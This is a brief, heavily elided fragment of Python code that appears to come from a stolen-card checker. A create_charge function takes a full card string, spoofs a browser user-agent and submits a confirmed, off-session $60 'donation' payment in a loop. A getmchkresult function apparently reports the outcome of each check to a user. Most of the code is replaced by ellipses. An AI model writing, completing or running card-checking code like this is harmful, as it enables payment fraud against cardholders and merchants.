...
def create_charge(fullcc):
    ...
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        ...
        data2 = f"amount=60&currency=usd&payment_method_types[]=card&description=donation&payment_method={id}&confirm=true&off_session=true"
        amt = 0
        while True:
...
def getmchkresult(fullcc, user_id):
    try:
